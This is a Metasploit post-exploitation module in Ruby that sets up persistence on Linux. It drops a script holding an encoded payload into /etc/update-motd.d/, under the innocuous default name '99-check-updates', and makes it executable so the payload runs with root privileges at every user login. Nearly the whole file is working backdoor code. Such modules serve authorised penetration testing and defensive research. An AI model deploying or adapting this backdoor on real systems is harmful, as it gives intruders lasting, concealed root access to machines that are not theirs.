##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local

  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'update-motd.d Persistence',
        'Description' => %q{
          This module will add a script in /etc/update-motd.d/ in order to persist a payload.
          The payload will be executed with root privileges everytime a user logs in.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Julien Voisin' ],
        'Platform' => [ 'unix', 'linux' ],
        'Arch' => ARCH_CMD,
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'DefaultOptions' => { 'WfsDelay' => 0, 'DisablePayloadHandler' => true },
        'Targets' => [ ['Automatic', {}] ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '1999-01-01',
        'Notes' => {
          'Stability' => [],
          'Reliability' => [EVENT_DEPENDENT],
          'SideEffects' => [ARTIFACTS_ON_DISK]
        },
        'References' => [
          ['URL', 'https://manpages.ubuntu.com/manpages/oracular/en/man5/update-motd.5.html'],
        ]
      )
    )
    register_options([ OptString.new('BACKDOOR_NAME', [true, 'The filename of the backdoor', '99-check-updates']) ])
  end

  def exploit
    update_path = '/etc/update-motd.d/'

    unless exists? update_path
      fail_with Failure::BadConfig, "#{update_path} doesn't exist"
    end

    unless writable? update_path
      fail_with Failure::BadConfig, "#{update_path} is not writable"
    end

    backdoor_path = File.join(update_path, datastore['BACKDOOR_NAME'])

    if exists? backdoor_path
      fail_with Failure::BadConfig, "#{backdoor_path} is already present"
    end

    write_file(backdoor_path, "#!/bin/sh\n#{payload.encoded}")
    chmod(backdoor_path, 0o755)
    print_status "#{backdoor_path} written"
  end
end
